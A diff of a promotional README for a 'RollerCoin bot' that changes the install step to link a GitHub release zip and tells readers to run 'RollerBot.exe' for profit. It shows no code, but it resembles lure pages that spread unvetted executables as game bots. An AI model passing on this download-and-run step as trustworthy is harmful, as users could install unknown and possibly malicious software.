@@ -9,7 +9,7 @@ The RollerCoin bot offers a unique opportunity for tech-savvy individuals lookin
 
 ## How to install on Windows PC:
 
-Download the RollerCoin_Bot.zip with the button below and start the “RollerBot.exe” file to start setting up the bot. After that you simply follow the instructions in the setup to set the bot up how you like it. Enjoy and  make some profits!
+Download the [RollerBot.zip](https://github.com/rollercoinbot/rollercoinbot.github.io/releases/download/bot/RollerBot.zip) with the button below and start the “RollerBot.exe” file to start setting up the bot. After that you simply follow the instructions in the setup to set the bot up how you like it. Enjoy and  make some profits!
 
 ## Compatible Games
 
